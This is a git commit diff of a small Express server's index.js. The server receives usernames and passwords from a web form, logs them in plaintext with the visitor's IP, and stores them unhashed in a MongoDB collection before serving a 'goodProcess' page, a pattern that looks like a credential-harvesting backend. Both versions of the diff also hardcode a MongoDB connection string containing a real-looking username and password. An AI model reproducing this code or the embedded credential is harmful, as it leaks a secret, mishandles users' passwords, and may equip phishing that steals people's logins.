f18d36fae74799410f8005e07f8c41f13e059783
wito <witoo132@icloud.com>
2023-12-20 20:42:13 +0100

    V7

--- index.js
+++ index.js
@@ -1,26 +1,26 @@
-const fs = require('fs');
 const express = require('express');
-const bodyParser = require('body-parser');
-const mongoose = require('mongoose');
+const { MongoClient } = require('mongodb');
 
 const app = express();
 
-app.use(express.json())
+app.use(express.json());
+app.use(express.urlencoded({ extended: true })); // Agrega esta línea para analizar datos de formularios codificados
 
-mongoose.connect('mongodb+srv://witooz123:Ds1wfuGUxaqGvdSW@datacluster.s71xtyr.mongodb.net/?retryWrites=true&w=majority', { useNewUrlParser: true, useUnifiedTopology: true })
-    .then(() => {
-        console.log('Conexión exitosa a MongoDB');
-    })
-    .catch((error) => {
-        console.error('Error de conexión a MongoDB:', error);
-    });
-
-// Definir un modelo de datos (ejemplo)
-const Message = mongoose.model('Message', {
-  user: String,
-  passwd: String,
-  timestamp: { type: Date, default: Date.now }
+app.use((req, res, next) => {
+    res.header('x-content-type-options', 'nosniff');
+    next();
 });
+
+app.disable('x-powered-by');
+
+function connectLog (req, user, passwd) {
+    const userIp = req.ip
+    const userUrl = req.url
+
+    console.log(`New connection -> IP: ${userIp} | Url: ${userUrl} | Data Received: Username -> ${user}, Password -> ${passwd}`)
+}
+
+const uri = 'mongodb+srv://witooz123:Ds1wfuGUxaqGvdSW@datacluster.s71xtyr.mongodb.net/?retryWrites=true&w=majority';
 
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
@@ -28,19 +28,29 @@ app.get('/', (req, res) => {
 
 app.post('/', async (req, res) => {
     try {
-        const { user, passwd } = req.body; // Extraer user y passwd del cuerpo de la solicitud
-    
-        // Guardar el mensaje en MongoDB
-        const message = new Message({ user, passwd }); // Construir el objeto Message directamente con user y passwd
-        await message.save();
-    
-        res.status(201).json(message);
+        const { user, passwd } = req.body;
+        connectLog(req, user, passwd)
+
+        // Conectar a la base de datos
+        const client = new MongoClient(uri);
+        await client.connect();
+
+        // Seleccionar la base de datos y la colección
+        const database = client.db('UserInfo');
+        const collection = database.collection('user');
+
+        // Insertar el mensaje en la colección
+        await collection.insertOne({ user, passwd });
+
+        // Desconectar del servidor de base de datos
+        await client.close();
+
+        res.status(201).sendFile(__dirname + '/goodProcess.html');
     } catch (error) {
         console.error(error);
         res.status(500).send('Error al guardar el mensaje en la base de datos.');
     }
 });
-
 
 const PORT = process.env.PORT || 3000;
 
